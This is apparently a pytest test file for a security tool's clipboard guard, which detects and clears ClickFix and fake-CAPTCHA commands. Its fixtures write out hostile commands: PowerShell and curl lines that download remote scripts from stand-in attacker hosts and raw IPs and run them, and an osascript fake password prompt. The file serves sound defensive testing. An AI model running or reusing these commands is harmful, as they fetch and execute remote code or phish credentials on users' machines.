"""Clipboard guard: ClickFix / fake-CAPTCHA commands on the clipboard are reported (and cleared when they carry the lure),
ordinary clipboard text is ignored, nothing but a masked excerpt is kept. Fake clipboards; no real clipboard needed
except in the Windows-only API test."""

import sys
from types import SimpleNamespace

import pytest

from aegis.core.config import Config
from aegis.core.models import Severity
from aegis.realtime import clipboard as cb

LURE = 'powershell -w h -nop -c "iex(irm https://check-human.example/v)" # I am not a robot - reCAPTCHA Verification ID: 4821'
CRADLE = "powershell -w hidden -c \"iwr http://185.234.10.5/a.ps1 | iex\""


class FakeClipboard:
    def __init__(self, text=None, clear_ok=True):
        self.text = text
        self.clear_ok = clear_ok
        self.cleared = 0

    def changed(self):
        return True

    def read(self):
        return self.text

    def clear(self):
        self.cleared += 1
        if self.clear_ok:
            self.text = ""
        return self.clear_ok


class FakeMonitor:
    def __init__(self, **cfg):
        self.config = Config()
        for k, v in cfg.items():
            setattr(self.config, k, v)
        self.signatures = SimpleNamespace(is_bad_domain=lambda d: d.endswith("evil-c2.example"))
        self.stats = __import__("collections").Counter()
        self.events = []

    def emit(self, finding, source=""):
        self.events.append((finding, source))
        return True

    def spawn(self, name, target):
        return SimpleNamespace(name=name)


# --------------------------------------------------------------------------- classification
def test_classify_windows_clipboard_text():
    assert cb.classify_clipboard(LURE, windows=True).severity == Severity.CRITICAL
    assert cb.classify_clipboard(CRADLE, windows=True).severity == Severity.HIGH
    for benign in ("hello world", "notepad", "https://example.com/page?a=1", "C:\\Users\\bob\\Documents\\x.docx",
                   "iwr https://get.scoop.sh -useb | iex", "", "   ", "password123!"):
        v = cb.classify_clipboard(benign, windows=True)
        assert v is None or v.severity < Severity.HIGH, benign
    assert cb.classify_clipboard(CRADLE + " " * cb.MAX_CLIPBOARD_CHARS, windows=True) is None  # a document, not a command


def test_classify_unix_clipboard_text():
    bad = lambda d: d.endswith("evil-c2.example")  # noqa: E731
    assert cb.classify_clipboard("curl -s https://evil-c2.example/i.sh | sh", bad, windows=False).severity == Severity.CRITICAL
    assert cb.classify_clipboard("curl -fsSL http://45.61.12.9/x | bash", bad, windows=False).severity == Severity.HIGH
    osa = "osascript -e 'display dialog \"Enter password\" default answer \"\" with hidden answer'"
    assert cb.classify_clipboard(osa, bad, windows=False).severity >= Severity.HIGH
    assert cb.classify_clipboard("curl -fsSL https://get.docker.com | sh", bad, windows=False) is None
    assert cb.classify_clipboard(LURE, bad, windows=False).severity == Severity.CRITICAL  # pwsh users on macOS / Linux


# --------------------------------------------------------------------------- guard
def test_guard_alerts_once_per_new_text_and_ignores_what_was_there_before():
    mon = FakeMonitor()
    clip = FakeClipboard(CRADLE)
    g = cb.ClipboardGuard(mon, clipboard=clip)
    assert g.start(__import__("threading").Event())  # the loop thread is spawned
    assert mon.events == []  # the baseline is never reported
    clip.text = "something else"
    assert g.tick() is None
    clip.text = CRADLE
    f = g.tick()
    assert f is not None and f.rule_id == "AEG-RT-CLIPBOARD" and f.severity == Severity.HIGH
    assert f.title.startswith("A malicious command was copied") and clip.cleared == 0  # HIGH: warn, never clear
    assert g.tick() is None and len(mon.events) == 1  # same text again: no repeat alert
    assert mon.events[0][1] == "clipboard-guard" and mon.stats["clipboard_alerts"] == 1


def test_guard_clears_the_lure_and_says_so():
    mon = FakeMonitor()
    clip = FakeClipboard("")
    g = cb.ClipboardGuard(mon, clipboard=clip)
    g.start(__import__("threading").Event())
    clip.text = LURE
    f = g.tick()
    assert f.severity == Severity.CRITICAL and f.title.startswith("Blocked:") and clip.cleared == 1 and clip.text == ""
    assert f.evidence["cleared"] is True and "T1204.004" in f.mitre and mon.stats["clipboard_cleared"] == 1
    assert "check-human.example" in f.evidence["command"] and len(f.evidence["command"]) <= 420
    assert g.tick() is None  # the emptied clipboard is not a new event


def test_guard_respects_the_settings_and_clear_failures():
    mon = FakeMonitor(realtime_clear_malicious_clipboard=False)
    clip = FakeClipboard("")
    g = cb.ClipboardGuard(mon, clipboard=clip)
    g.start(__import__("threading").Event())
    clip.text = LURE
    f = g.tick()
    assert f.severity == Severity.CRITICAL and clip.cleared == 0 and not f.title.startswith("Blocked")

    mon = FakeMonitor()
    clip = FakeClipboard("", clear_ok=False)
    g = cb.ClipboardGuard(mon, clipboard=clip)
    g.start(__import__("threading").Event())
    clip.text = LURE
    f = g.tick()
    assert clip.cleared == 1 and f.evidence["cleared"] is False and not f.title.startswith("Blocked")

    off = FakeMonitor(realtime_clipboard_guard=False)
    assert cb.ClipboardGuard(off, clipboard=FakeClipboard(LURE)).start(__import__("threading").Event()) == []


def test_guard_without_a_clipboard_does_not_start(monkeypatch):
    mon = FakeMonitor()
    g = cb.ClipboardGuard(mon)
    monkeypatch.setattr(g, "_default_clipboard", lambda: None)
    assert g.start(__import__("threading").Event()) == [] and g.available is False
    unreadable = cb.ClipboardGuard(mon, clipboard=FakeClipboard(None))
    unreadable.start(__import__("threading").Event())
    assert unreadable.tick() is None


def test_secrets_in_the_command_are_masked():
    token = "ghp_" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"
    text = f'powershell -w hidden -c "iwr http://185.234.10.5/a.ps1 -Headers @{{Authorization=\'token {token}\'}} | iex"'
    v = cb.classify_clipboard(text, windows=True)
    f = cb.clipboard_finding(text, v, None)
    assert token not in f.evidence["command"] and token not in f.description


# --------------------------------------------------------------------------- command-line clipboards
def test_unix_clipboard_tool_selection(monkeypatch):
    monkeypatch.setattr(cb, "IS_MAC", False)
    have = lambda *tools: (lambda name: f"/usr/bin/{name}" if name in tools else None)  # noqa: E731
    assert cb.unix_clipboard_commands(have("wl-paste", "wl-copy", "xclip"))[0][0] == "wl-paste"
    assert cb.unix_clipboard_commands(have("xclip"))[0] == ["xclip", "-selection", "clipboard", "-o"]
    assert cb.unix_clipboard_commands(have("xsel"))[1] == ["xsel", "--clipboard", "--clear"]
    assert cb.unix_clipboard_commands(have()) is None
    monkeypatch.setattr(cb, "IS_MAC", True)
    assert cb.unix_clipboard_commands(have("pbpaste", "pbcopy")) == (["pbpaste"], ["pbcopy"])


def test_command_clipboard_read_and_clear():
    calls = []

    def runner(cmd, timeout=60, input_text=None):
        calls.append((cmd, input_text))
        return (0, "copied text", "") if cmd[0] == "pbpaste" else (0, "", "")

    c = cb.CommandClipboard(["pbpaste"], ["pbcopy"], runner)
    assert c.changed() and c.read() == "copied text" and c.clear()
    assert calls[-1] == (["pbcopy"], "")  # pbcopy with empty input empties the clipboard
    failing = cb.CommandClipboard(["xclip", "-o"], ["xclip", "-i"], lambda cmd, timeout=60, input_text=None: (1, "", "no X"))
    assert failing.read() is None and failing.clear() is False


def test_monitor_includes_the_clipboard_guard(tmp_path, monkeypatch):
    from aegis.realtime import monitor as M

    monkeypatch.setenv("AEGIS_HOME", str(tmp_path))
    assert "clipboard" in M.ALL_COMPONENTS
    cfg = Config()
    cfg.notifications = False
    mon = M.RealtimeMonitor(cfg, SimpleNamespace(), components=("clipboard",))
    monkeypatch.setattr(mon.clipboard, "_default_clipboard", lambda: None)
    mon.start()
    try:
        assert mon.clipboard.available is False  # no clipboard here: the other guards would still run
    finally:
        mon.stop(timeout=2.0)


@pytest.mark.skipif(sys.platform != "win32", reason="uses the Windows clipboard API")
def test_windows_clipboard_api_smoke():
    sid = cb.windows_session_id()
    assert isinstance(sid, int)
    if sid == 0:
        pytest.skip("running in the services session (no user clipboard)")
    clip = cb.WindowsClipboard()
    assert clip.changed() is True and clip.changed() is False  # unchanged sequence number: nothing to read
    text = clip.read()
    assert text is None or isinstance(text, str)


def test_switching_the_guard_off_applies_immediately():
    mon = FakeMonitor()
    clip = FakeClipboard("")
    g = cb.ClipboardGuard(mon, clipboard=clip)
    g.start(__import__("threading").Event())
    mon.config.realtime_clipboard_guard = False
    clip.text = LURE
    assert g.tick() is None and clip.cleared == 0
    mon.config.realtime_clipboard_guard = True
    assert g.tick() is not None
